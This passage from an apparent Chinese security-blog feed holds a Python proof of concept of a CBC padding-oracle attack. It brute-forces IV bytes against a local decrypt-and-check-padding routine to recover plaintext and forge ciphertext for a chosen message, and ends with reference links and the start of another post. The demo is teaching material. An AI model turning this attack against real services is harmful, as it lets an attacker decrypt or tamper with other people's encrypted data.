class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    CBC Padding Oracle Demo</span></span><br><span class="line"><span class="string">    Author: hosch3n</span></span><br><span class="line"><span class="string">    Reference: https://hosch3n.github.io/2021/08/10/PaddingOracle%E6%94%BB%E5%87%BB/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Padding Oracle Attack POC(CBC-MODE)</span></span><br><span class="line"><span class="string">    Author: axis(axis@ph4nt0m.org)</span></span><br><span class="line"><span class="string">    http://hi.baidu.com/aullik5</span></span><br><span class="line"><span class="string">    2011.9</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    This program is based on Juliano Rizzo and Thai Duong&#x27;s talk on </span></span><br><span class="line"><span class="string">    Practical Padding Oracle Attack.(http://netifera.com/research/)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    For Education Purpose Only!!!</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="string">    it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="string">    the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="string">    (at your option) any later version.</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="string">    but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="string">    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="string">    GNU General Public License for more details.</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="string">    along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, ARC2, Blowfish, CAST, DES, DES3</span><br><span class="line"><span class="comment"># from base64 import b64encode</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_pkcs</span>(<span class="params">plaintext, block_size</span>):</span></span><br><span class="line">    <span class="comment"># Calculate Padding Byte</span></span><br><span class="line">    <span class="comment"># The Byte Value is Length</span></span><br><span class="line">    padding_byte = block_size - len(plaintext) % block_size</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Make Padding</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(padding_byte):</span><br><span class="line">        plaintext.append(padding_byte)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cbc_encrypt</span>(<span class="params">plaintext, IV, SMKEY, CIPHER</span>):</span></span><br><span class="line">    <span class="comment"># String to ByteArray</span></span><br><span class="line">    plaintext = bytearray(plaintext, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># SMKEY Length</span></span><br><span class="line">    key_len = len(SMKEY)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> CIPHER == <span class="string">&quot;AES&quot;</span>:</span><br><span class="line">        <span class="comment"># AES SMKEY Length must be 16/24/32</span></span><br><span class="line">        <span class="comment"># AES-128 / AES-192 / AES-256</span></span><br><span class="line">        <span class="keyword">if</span> key_len != <span class="number">16</span> <span class="keyword">and</span> key_len != <span class="number">24</span> <span class="keyword">and</span> key_len != <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        cipher_object = AES.new(SMKEY, AES.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;ARC2&quot;</span>:</span><br><span class="line">        cipher_object = ARC2.new(SMKEY, ARC2.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;Blowfish&quot;</span>:</span><br><span class="line">        cipher_object = Blowfish.new(SMKEY, Blowfish.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;CAST&quot;</span>:</span><br><span class="line">        cipher_object = CAST.new(SMKEY, CAST.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;DES&quot;</span> <span class="keyword">and</span> key_len == <span class="number">8</span>:</span><br><span class="line">        cipher_object = DES.new(SMKEY, DES.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;3DES&quot;</span> <span class="keyword">and</span> key_len == <span class="number">16</span>:</span><br><span class="line">        cipher_object = DES3.new(SMKEY, DES3.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Make Padding</span></span><br><span class="line">    plaintext = padding_pkcs(plaintext, len(IV))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher_object.encrypt(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cbc_decrypt</span>(<span class="params">cipher_bytes, IV, SMKEY, CIPHER</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (len(cipher_bytes) % <span class="number">8</span> != <span class="number">0</span>) <span class="keyword">or</span> (len(IV) % <span class="number">8</span> != <span class="number">0</span>):</span><br><span class="line">        print(<span class="string">&quot;[-] cipher_bytes length != IV length&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> CIPHER == <span class="string">&quot;AES&quot;</span>:</span><br><span class="line">        cipher_object = AES.new(SMKEY, AES.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;ARC2&quot;</span>:</span><br><span class="line">        cipher_object = ARC2.new(SMKEY, ARC2.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;Blowfish&quot;</span>:</span><br><span class="line">        cipher_object = Blowfish.new(SMKEY, Blowfish.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;CAST&quot;</span>:</span><br><span class="line">        cipher_object = CAST.new(SMKEY, CAST.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;DES&quot;</span>:</span><br><span class="line">        cipher_object = DES.new(SMKEY, DES.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">elif</span> CIPHER == <span class="string">&quot;3DES&quot;</span>:</span><br><span class="line">        cipher_object = DES3.new(SMKEY, DES3.MODE_CBC, IV)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher_object.decrypt(cipher_bytes)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split_block</span>(<span class="params">any_bytes, block_size=<span class="number">8</span></span>):</span></span><br><span class="line">    any_len = len(any_bytes)</span><br><span class="line">    <span class="keyword">if</span> any_len % block_size != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Split any_bytes by block_size</span></span><br><span class="line">    <span class="keyword">return</span> [any_bytes[offset:offset+block_size] <span class="keyword">for</span> offset <span class="keyword">in</span> range(<span class="number">0</span>, any_len, block_size)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_iv</span>(<span class="params">block_iv_list, block_intermediary_list, padding_byte</span>):</span></span><br><span class="line">    block_iv_list_len = len(block_iv_list)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, block_iv_list_len):</span><br><span class="line">        block_iv_list[i] = chr(ord(block_intermediary_list[i]) ^ padding_byte)</span><br><span class="line">    <span class="keyword">return</span> block_iv_list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_pkcs</span>(<span class="params">plain_bytes, padding_byte</span>):</span></span><br><span class="line">    <span class="keyword">if</span> len(plain_bytes) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Exact Block Number</span></span><br><span class="line">    points = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Calculate Points</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, padding_byte+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> plain_bytes[-i] == padding_byte:</span><br><span class="line">            points += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> points == padding_byte:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle_block</span>(<span class="params">cipher_bytes, block_size, next_iv, SMKEY, CIPHER</span>):</span></span><br><span class="line">    block_dict = &#123;&#125;</span><br><span class="line">    block_plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">    block_intermediary_list = []</span><br><span class="line">    block_iv_list = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct Padding Bytes</span></span><br><span class="line">    <span class="keyword">for</span> padding_byte <span class="keyword">in</span> range(<span class="number">1</span>, block_size+<span class="number">1</span>):</span><br><span class="line">        tmp_iv_list = []</span><br><span class="line">        block_iv_list = set_iv(block_iv_list, block_intermediary_list, padding_byte)</span><br><span class="line">        block_iv_list_len = len(block_iv_list)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Initialize IV</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">0</span>, block_size - padding_byte):</span><br><span class="line">            tmp_iv_list.append(<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">        tmp_iv_list.append(<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">        tmp_iv_list_len = len(tmp_iv_list)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Brute Force</span></span><br><span class="line">        <span class="keyword">for</span> iv_ascii <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">            <span class="comment"># Edit item by list</span></span><br><span class="line">            try_iv_list = tmp_iv_list</span><br><span class="line">            try_iv_list[tmp_iv_list_len<span class="number">-1</span>] = chr(iv_ascii)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># list to string</span></span><br><span class="line">            try_iv_str = <span class="string">&quot;&quot;</span>.join(try_iv_list)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Reverse Append</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, block_iv_list_len):</span><br><span class="line">                try_iv_str += block_iv_list[block_iv_list_len<span class="number">-1</span>-i]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Trigger Decrypt[Rewrite]</span></span><br><span class="line">            plain_bytes = cbc_decrypt(cipher_bytes, try_iv_str.encode(<span class="string">&quot;latin1&quot;</span>), SMKEY, CIPHER)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check Error[Rewrite]</span></span><br><span class="line">            flag = check_pkcs(plain_bytes, padding_byte)</span><br><span class="line">            <span class="keyword">if</span> flag == <span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Get the Silver Bullet</span></span><br><span class="line">            <span class="comment"># Dynamic Array append O(1)</span></span><br><span class="line">            block_iv_list.append(chr(iv_ascii))</span><br><span class="line">            block_intermediary_list.append(chr(iv_ascii ^ padding_byte))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Revert block_intermediary and block_plaintext</span></span><br><span class="line">    block_intermediary_list_len = len(block_intermediary_list)</span><br><span class="line">    block_dict[<span class="string">&quot;intermediary&quot;</span>] = <span class="string">&quot;&quot;</span>.join(block_intermediary_list[::<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">if</span> next_iv != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, block_intermediary_list_len):</span><br><span class="line">            block_plaintext += chr(next_iv[i] ^ ord(block_intermediary_list[block_intermediary_list_len<span class="number">-1</span>-i]))</span><br><span class="line">        block_dict[<span class="string">&quot;plaintext&quot;</span>] = block_plaintext</span><br><span class="line">    <span class="keyword">return</span> block_dict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle_decrypt</span>(<span class="params">cipher_bytes, block_size, IV, SMKEY, CIPHER</span>):</span></span><br><span class="line">    next_iv = IV</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Split cipher_bytes by block_size</span></span><br><span class="line">    cipher_blocks = split_block(cipher_bytes, block_size)</span><br><span class="line">    <span class="keyword">if</span> cipher_blocks == <span class="literal">False</span>:</span><br><span class="line">        print(<span class="string">&quot;[-] Split Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    result_dict = &#123;&#125;</span><br><span class="line">    result_dict[<span class="string">&quot;intermediary&quot;</span>] = <span class="string">&quot;&quot;</span></span><br><span class="line">    result_dict[<span class="string">&quot;plaintext&quot;</span>] = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Attack block by block</span></span><br><span class="line">    <span class="keyword">for</span> cipher_block <span class="keyword">in</span> cipher_blocks:</span><br><span class="line">        <span class="comment"># Get This Block Intermediary and Plaintext</span></span><br><span class="line">        block_dict = oracle_block(cipher_block, block_size, next_iv, SMKEY, CIPHER)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Add Block Result</span></span><br><span class="line">        result_dict[<span class="string">&quot;intermediary&quot;</span>] += block_dict[<span class="string">&quot;intermediary&quot;</span>]</span><br><span class="line">        result_dict[<span class="string">&quot;plaintext&quot;</span>] += block_dict[<span class="string">&quot;plaintext&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Set IV to next cipher_block</span></span><br><span class="line">        next_iv = cipher_block</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result_dict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_xor</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    x_len = len(x)</span><br><span class="line">    y_len = len(y)</span><br><span class="line">    <span class="keyword">if</span> x_len != y_len:</span><br><span class="line">        print(<span class="string">&quot;[-] str_xor Length Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># type(bytearray[i]) is int</span></span><br><span class="line">    z = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, x_len):</span><br><span class="line">        z += chr(ord(x[i]) ^ y[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> z</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle_encrypt</span>(<span class="params">WPSTRING, cipher_bytes, block_size, SMKEY, CIPHER</span>):</span></span><br><span class="line">    <span class="comment"># String to ByteArray</span></span><br><span class="line">    plaintext = bytearray(WPSTRING, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment"># Make Padding</span></span><br><span class="line">    plaintext = padding_pkcs(plaintext, block_size)</span><br><span class="line">    <span class="comment"># Split plaintext by block_size and Reverse</span></span><br><span class="line">    plaintext_blocks = split_block(plaintext, block_size)</span><br><span class="line">    plaintext_blocks.reverse()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Split cipher_bytes by block_size</span></span><br><span class="line">    cipher_blocks = split_block(cipher_bytes, block_size)</span><br><span class="line">    cipher_blocks_num = len(cipher_blocks)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get the Last One Block</span></span><br><span class="line">    payload = cipher_blocks[<span class="number">-1</span>]</span><br><span class="line">    prev_block_bytes = cipher_blocks[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> plaintext_block <span class="keyword">in</span> plaintext_blocks:</span><br><span class="line">        <span class="comment"># Get the block_intermediary</span></span><br><span class="line">        block_dict = oracle_block(prev_block_bytes, block_size, <span class="string">&quot;&quot;</span>, SMKEY, CIPHER)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Get the Cipher Block</span></span><br><span class="line">        prev_block_bytes = str_xor(block_dict[<span class="string">&quot;intermediary&quot;</span>], plaintext_block).encode(<span class="string">&quot;latin1&quot;</span>)</span><br><span class="line"></span><br><span class="line">        payload = prev_block_bytes + payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># Origin Plaintext</span></span><br><span class="line">    OPSTRING = <span class="string">&quot;abcdefghabcdefghxxxxxx&quot;</span></span><br><span class="line">    <span class="comment"># Want Plaintext</span></span><br><span class="line">    WPSTRING = <span class="string">&quot;aaaaaaaaaaaaaaaa\r\n\tzzz&quot;</span></span><br><span class="line"></span><br><span class="line">    CIPHER = <span class="string">&quot;AES&quot;</span></span><br><span class="line">    <span class="comment"># CIPHER = &quot;ARC2&quot;</span></span><br><span class="line">    <span class="comment"># CIPHER = &quot;Blowfish&quot;</span></span><br><span class="line">    <span class="comment"># CIPHER = &quot;CAST&quot;</span></span><br><span class="line">    <span class="comment"># CIPHER = &quot;DES&quot;</span></span><br><span class="line">    <span class="comment"># CIPHER = &quot;3DES&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Intermediary Value</span></span><br><span class="line">    <span class="keyword">if</span> CIPHER == <span class="string">&quot;AES&quot;</span>:</span><br><span class="line">        IV = <span class="string">b&quot;1234567812345678&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        IV = <span class="string">b&quot;12345678&quot;</span></span><br><span class="line">    <span class="comment"># Symmetric Key</span></span><br><span class="line">    <span class="keyword">if</span> CIPHER != <span class="string">&quot;DES&quot;</span>:</span><br><span class="line">        SMKEY = <span class="string">b&quot;~!@#$%^&amp;*()_+`-=&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        SMKEY = <span class="string">b&quot;~!@#$%^&amp;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># AES Per-Block Size is 16</span></span><br><span class="line">    <span class="keyword">if</span> CIPHER == <span class="string">&quot;AES&quot;</span>:</span><br><span class="line">        block_size = <span class="number">16</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        block_size = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># IV must same as block_size</span></span><br><span class="line">    <span class="keyword">if</span> len(IV) != block_size:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># CBC Encrypt</span></span><br><span class="line">    cipher_bytes = cbc_encrypt(OPSTRING, IV, SMKEY, CIPHER)</span><br><span class="line">    <span class="keyword">if</span> cipher_bytes == <span class="literal">False</span>:</span><br><span class="line">        print(<span class="string">&quot;[-] Encrypt Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Padding Oracle Decrypt</span></span><br><span class="line">    result_dict = oracle_decrypt(cipher_bytes, block_size, IV, SMKEY, CIPHER)</span><br><span class="line">    <span class="keyword">if</span> result_dict == <span class="literal">False</span>:</span><br><span class="line">        print(<span class="string">&quot;[-] Attack Error!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    print(result_dict)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Configuring Payload in Local</span></span><br><span class="line">    payload = oracle_encrypt(WPSTRING, cipher_bytes, block_size, SMKEY, CIPHER)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># CBC Decrypt</span></span><br><span class="line">    <span class="comment"># plain_bytes = cbc_decrypt(cipher_bytes, IV, SMKEY, CIPHER)</span></span><br><span class="line">    plain_bytes = cbc_decrypt(payload[block_size:], payload[:block_size], SMKEY, CIPHER)</span><br><span class="line">    print(plain_bytes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC)">Cipher block chaining (CBC)</a></p><p><a href="https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html">Automated Padding Oracle Attacks With PadBuster</a></p><p><a href="https://www.cnblogs.com/zlhff/p/5519175.html">Padding Oracle Attack的一些细节与实现</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;根据加解密时是否用同一组密钥，可以分为对称加密和非对称加密。对称加密中根据对数据处理粒度的不同，可以分为分组加密算法（AES、3DES、DES、Blowfish、RC2、CAST）和流加密算法（ChaCha20、Salsa20、RC4）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;常见的非对</summary>
      
    
    
    
    <category term="密码学" scheme="https://hosch3n.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="PaddingOracle" scheme="https://hosch3n.github.io/tags/PaddingOracle/"/>
    
    <category term="cbc" scheme="https://hosch3n.github.io/tags/cbc/"/>
    
  </entry>
  
  <entry>
    <title>关于修复Hotcobalt的一些小想法</title>
    <link href="https://hosch3n.github.io/2021/08/06/%E5%85%B3%E4%BA%8E%E4%BF%AE%E5%A4%8DHotcobalt%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%83%B3%E6%B3%95/"/>
    <id>https://hosch3n.github.io/2021/08/06/%E5%85%B3%E4%BA%8E%E4%BF%AE%E5%A4%8DHotcobalt%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%83%B3%E6%B3%95/</id>
    <published>2021-08-05T16:21:54.000Z</published>
    <updated>2022-05-17T06:36:28.554Z</updated>
    
